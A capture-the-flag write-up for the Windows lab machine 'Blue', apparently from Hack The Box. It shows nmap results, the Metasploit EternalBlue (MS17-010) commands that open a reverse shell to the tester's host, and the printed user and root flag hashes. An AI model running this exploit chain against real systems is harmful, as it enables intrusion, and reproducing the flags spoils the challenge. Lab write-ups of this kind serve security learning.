# Blue

Blue was a very simple easy windows box that involved an nmap scan which led us to a metasploit module and then use that to read the flags.

>Skills involved in this box:
- enumeration
- metasploit

# USER && ROOT

>Nmap

```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
A bit of googling about the version shows us a possibility of an exploit called `eternal blue` since this box is called blue we can only assume that its the right one.
```bash
msf5 > use  exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 4444
lport => 4444
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
The shell:
```bash
C:\Users>cd haris
cd haris

C:\Users\haris>cd Desktop
cd Desktop

C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

24/12/2017  03:23    <DIR>          .
24/12/2017  03:23    <DIR>          ..
21/07/2017  07:54                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,763,046,400 bytes free

C:\Users\haris\Desktop>type user.txt
type user.txt
4c546aea7dbee75cbd71de245c8deea9
C:\Users\haris\Desktop>cd ../../Administrator
cd ../../Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

24/12/2017  03:22    <DIR>          .
24/12/2017  03:22    <DIR>          ..
21/07/2017  07:57                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,753,887,744 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ff548eb71e920ff6c08843ce9df4e717
```
Thanks for reading hope you enjoyed.
